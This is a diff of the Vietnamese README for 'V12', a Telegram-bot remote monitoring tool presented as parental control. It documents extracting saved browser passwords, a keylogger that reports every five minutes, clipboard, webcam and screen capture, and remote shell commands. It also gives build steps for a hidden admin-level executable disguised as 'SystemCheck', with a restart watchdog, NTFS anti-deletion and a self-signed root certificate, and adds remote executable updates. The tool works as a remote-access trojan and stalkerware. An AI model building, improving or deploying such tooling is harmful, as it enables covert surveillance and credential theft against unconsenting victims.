@@ -5,7 +5,7 @@
 > **Developer:** TsByin  
 > **Version:** 12.0 (Hardened, Full-Featured & Optimized)
 
-Công cụ quản lý và giám sát máy tính từ xa qua Telegram Bot. V12 bổ sung: sửa 13 lỗi bảo mật, file explorer phân trang, ghi video MP4 tùy chỉnh, watchdog tự khởi động lại, keylogger quản lý con cái có window-aware, lưu trạng thái qua restart, audit log, dashboard /status, /disk, /ps filter, /net, /events, clipboard monitor, remote desktop lite (/stream), hot-reload /reload.
+Công cụ quản lý và giám sát máy tính từ xa qua Telegram Bot. V12 bổ sung: đã tối ưu hiệu năng (ThreadPoolExecutor 12 workers, non-blocking monitor, dedicated intrusion thread), sửa 13+ lỗi, file explorer phân trang, ghi video MP4 tùy chỉnh, watchdog tự khởi động lại, keylogger quản lý con cái window-aware, lưu trạng thái qua restart, audit log, dashboard /status, /disk, /ps filter, /net, /events, clipboard monitor, remote desktop lite (/stream), hot-reload /reload, khởi động lại bot từ xa (/restart), **remote update EXE từ xa qua NAS WebDAV** (/update, /rollback).
 
 > **⚠️ LƯU Ý PHÁP LÝ:** Công cụ này được thiết kế cho mục đích **Quản lý con cái** hoặc **Quản trị hệ thống cá nhân**. Việc sử dụng công cụ này để theo dõi máy tính của người khác mà không có sự đồng ý là vi phạm pháp luật. Tác giả không chịu trách nhiệm về bất kỳ hành vi sử dụng sai mục đích nào.
 
@@ -16,45 +16,45 @@ Công cụ quản lý và giám sát máy tính từ xa qua Telegram Bot. V12 b�
 ```
 V12/
 ├── Core Modules (9 files)
-│   ├── V12.py          - Main bot entry (~1350+ dòng) ⭐
-│   ├── config.py       - Cấu hình & logging
+│   ├── V12.py          - Main bot entry (~2000+ dòng) ⭐
+│   ├── config.py       - Cấu hình, logging, NAS WebDAV vars
 │   ├── utils.py        - Tiện ích hệ thống, audit log, settings
 │   ├── grabber.py      - Trích xuất password/history (concurrent)
 │   ├── media.py        - Screen/webcam/audio capture, MP4
 │   ├── monitor.py      - Background daemon + BotStats + ClipMonitor
-│   ├── watchdog.py     - Tự khởi động lại khi crash (NEW)
-│   ├── keylogger.py    - Keylogger window-aware (NEW)
+│   ├── watchdog.py     - Tự khởi động lại khi crash (build riêng)
+│   ├── keylogger.py    - Keylogger window-aware, tự gửi 5 phút
 │   └── verify_setup.py - Kiểm tra cài đặt
 │
 ├── Configuration
 │   ├── .env            - Token & cài đặt (REQUIRED)
 │   ├── requirements.txt - Dependencies
-│   ├── settings.json   - State persist tự tạo (block/taskmgr/alert/clipboard)
+│   ├── settings.json   - State persist tự tạo
 │   ├── blocked.json    - Danh sách chặn tự tạo
-│   └── audit.log       - Audit trail tự tạo
+│   ├── audit.log       - Audit trail tự tạo
+│   └── .update_backup  - Meta cho /rollback (tự tạo khi update)
 │
 └── Build & Docs
     ├── dist/           - Folder EXE đã biên dịch
     ├── README.md       - File này
     ├── ARCHITECTURE.md - Kiến trúc hệ thống
-    ├── LOGIC_FLOWS.md  - Sơ đồ luồng chi tiết
     ├── QUICK_START.md  - Hướng dẫn nhanh
-    └── BUILD_EXE.md    - Hướng dẫn build EXE
-```
+    └── BUILD_EXE.md    - Hướng dẫn build EXE (cả watchdog)```
 
 **V12 Architecture (Hardened & Full-Featured):**
 - ✅ Modular design (9 modules + 1 main entry point)
 - ✅ .env-based secure configuration (không hardcode secrets)
-- ✅ Concurrent password extraction (ThreadPoolExecutor — 2-3x faster)
-- ✅ Multi-file password/history output (tất cả profiles tất cả browsers)
-- ✅ Background monitor daemon (CPU/motion alerts, clipboard monitor)
-- ✅ Watchdog process tự khởi động lại khi crash (Task Scheduler)
+- ✅ **ThreadPoolExecutor(max_workers=12)** — tất cả handler nặng được submit vào pool, không spawn bare thread
+- ✅ Concurrent password extraction (2-3x nhanh hơn)
+- ✅ Background monitor daemon: non-blocking cpu_percent, dedicated intrusion thread
+- ✅ Watchdog process tự khởi động lại khi crash (Task Scheduler, build riêng watchdog.exe)
 - ✅ Keylogger window-aware và tự gửi qua Telegram mỗi 5 phút
 - ✅ State persistence — lưu/khôi phục trạng thái sau restart
 - ✅ Audit log mọi lệnh được thực thi
 - ✅ Remote desktop lite (/stream)
 - ✅ Hot-reload cấu hình (/reload)
-- ✅ Text-based ReplyKeyboard + 21 slash commands tự đăng ký
+- ✅ **Remote update EXE từ xa** (/update NAS WebDAV/URL, /rollback, backup tự động)
+- ✅ Text-based ReplyKeyboard + 25 slash commands tự đăng ký
 - ✅ File browser phân trang, per-item buttons (xem/tải/xóa/upload)
 - ✅ Logging đầy đủ ra bot.log
 
@@ -137,9 +137,10 @@ V12/
 
   * **State Persistence:** Trạng thái block/taskmgr/alert/clipboard tự lưu vào `settings.json` → khôi phục sau restart.
   * **Audit Log:** Mọi lệnh thực thi được ghi vào `audit.log` kèm timestamp (xem qua `/auditlog [N]`).
-  * **Bot Commands Auto-Register:** 22 lệnh slash tự đăng ký vào Telegram khi bot khởi động.
+  * **Bot Commands Auto-Register:** 26 lệnh slash tự đăng ký vào Telegram khi bot khởi động.
   * **Hot-Reload Config:** Chỉnh `.env` rồi gửi `/reload` → bot cập nhật ngay không cần restart.
   * **Clipboard Monitor:** Tự động theo dõi clipboard và gửi cảnh báo khi có nội dung mới (`/clipmon`).
+  * **Remote Update EXE:** Tải EXE mới từ NAS WebDAV hoặc URL, backup tự động, swap và restart không cần physical access (`/update [url]`, `/rollback`).
 
 -----
 
@@ -183,6 +184,11 @@ MONITOR_INTERVAL=1
 CPU_ALERT_THRESHOLD=95
 CPU_ALERT_COOLDOWN=300
 MOTION_DETECT_AREA=3000
+
+# Tùy chọn — Remote Update qua NAS WebDAV
+NAS_WEBDAV_URL=https://domain:port/Bot_Updates/SystemCheck.exe
+NAS_WEBDAV_USER=username
+NAS_WEBDAV_PASS=password
 ```
 
 ### Bước 2: Lấy Telegram Token & Admin ID
@@ -214,13 +220,23 @@ python -c "from config import API_TOKEN, ADMIN_ID; print(f'✅ Config OK — Tok
 
 ### Bước 2: Build file EXE
 
-Sử dụng PyInstaller để đóng gói thành 1 file duy nhất, chạy ngầm:
+Build **cả 2 EXE** — main bot và watchdog:
 
 ```bash
-pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V12.py
-```*File kết quả sẽ nằm trong thư mục `dist/SystemCheck.exe`.*
+# Main bot
+pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" ^
+  --hidden-import=pycaw.pycaw --hidden-import=comtypes --hidden-import=comtypes.client ^
+  --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 ^
+  --hidden-import=win32com.client --hidden-import=win32com.shell ^
+  V12.py
 
-**Lưu ý:** File `.env` phải ở cùng thư mục với `SystemCheck.exe`
+# Watchdog (tự restart khi crash, build riêng)
+pyinstaller --onefile --noconsole --icon=icon.ico --name="watchdog" watchdog.py
+```
+
+*File kết quả: `dist/SystemCheck.exe` (~76 MB) và `dist/watchdog.exe` (~8-12 MB)*
+
+**Lưu ý:** File `.env` phải ở cùng thư mục với cả 2 EXE. Chạy `watchdog.exe` as Administrator — nó sẽ tự launch `SystemCheck.exe`.
 
 ### Bước 3: Ký Chữ Ký Số (Code Signing) - Optional
 
@@ -235,6 +251,7 @@ $rootStore.Open("ReadWrite"); $rootStore.Add($cert); $rootStore.Close()
 
 # 2. Ký vào file EXE
 Set-AuthenticodeSignature -Certificate $cert -FilePath "dist\SystemCheck.exe"
+Set-AuthenticodeSignature -Certificate $cert -FilePath "dist\watchdog.exe"
 
 # 3. Xuất file chứng chỉ (Để cài sang máy khác)
 Export-Certificate -Cert $cert -FilePath "dist\Cert.cer"
@@ -263,7 +280,7 @@ Khi gõ `/start` hoặc `/menu`, bot sẽ hiển thị menu với các nút như
 
 **Chỉ cần bấm các nút để thực hiện lệnh - không cần gõ text phức tạp.**
 
-### Các lệnh Slash (V12 — 22 commands):
+### Các lệnh Slash (V12 — 26 commands):
 
 | Lệnh | Mô tả |
 | :--- | :--- |
@@ -288,8 +305,12 @@ Khi gõ `/start` hoặc `/menu`, bot sẽ hiển thị menu với các nút như
 | `/kill <pid>` | Kết thúc tiến trình theo PID |
 | `/clipmon` | Toggle tự động giám sát clipboard |
 | `/reload` | Hot-reload cấu hình từ `.env` không cần restart |
+| `/restart` | Khởi động lại bot ngay (watchdog sẽ tự bring-up lại) |
+| `/update [url]` | Tải EXE mới từ NAS/URL, swap & restart (chỉ EXE mode) |
+| `/rollback` | Khôi phục EXE cũ sau khi update |
+| `/cancel` | Hủy thao tác đang chờ (file upload) |
+| `/stop` | Tắt bot hoàn toàn (không tự restart) |
 | `/auditlog [N]` | Xem N dòng audit log gần nhất (default 20) |
-| `/list` | Liệt kê app/web đang bị chặn |
 
 ### Công Dụng Từng Nút Menu:
 
@@ -431,17 +452,18 @@ Khi kích hoạt:
 
 **Nguyên nhân:** Cơ chế chống xóa (NTFS permission) đang bật.
 
-**Cách sửa:**
-- Gửi lệnh đặc biệt reset quyền:
-  ```
-  /cmd icacls "%APPDATA%\Microsoft\Windows\SystemMonitor" /reset /T
-  ```
-- Sau đó tắt bot hoàn toàn (kể cả watchdog) bằng lệnh:
-  ```
-  /stop
-  ```
-  > ⚠️ **Không dùng** `/cmd taskkill` — lệnh đó bị chặn bởi whitelist. Dùng `/stop` để tắt bot đúng cách.
-- Bây giờ có thể xóa folder.
+**Cách sửa — thực hiện đúng thứ tự:**
+1. **Trước tiên** gửi lệnh reset quyền (bot phải đang chạy mới thực hiện được):
+   ```
+   /cmd icacls "%APPDATA%\Microsoft\Windows\SystemMonitor" /reset /T
+   ```
+2. **Sau đó** mới tắt bot:
+   ```
+   /stop
+   ```
+   > ⚠️ **Không đảo ngược thứ tự** — nếu tắt bot trước, quyền NTFS vẫn bị khóa và bạn sẽ không vào được folder.
+   > ⚠️ **Không dùng** `/cmd taskkill` — lệnh đó bị chặn bởi whitelist. Dùng `/stop` để tắt bot đúng cách.
+3. Bây giờ có thể vào folder, thay file, hoặc xóa.
 
 **6. Webcam / Audio không hoạt động?**
 
@@ -494,9 +516,10 @@ Khi kích hoạt:
 
 - **File size:** Max 20MB upload/download qua Telegram.
 - **Timeout:** Command tối đa 30 giây, nếu quá lâu sẽ timeout.
-- **Concurrent:** Max 4 thread chạy cùng lúc (ThreadPoolExecutor).
+- **Concurrent:** Max 12 worker threads (ThreadPoolExecutor) cho tất cả lệnh nặng.
 - **Compression:** Password/history file được gzip compress tự động.
 - **Logging:** Tất cả action log vào `bot.log` trong folder chạy.
+- **Remote Update:** `/update` chỉ hoạt động khi chạy dưới dạng EXE (frozen mode), không hoạt động khi chạy từ source .py.
 
 ### Bảo Mật & Pháp Lý:
 
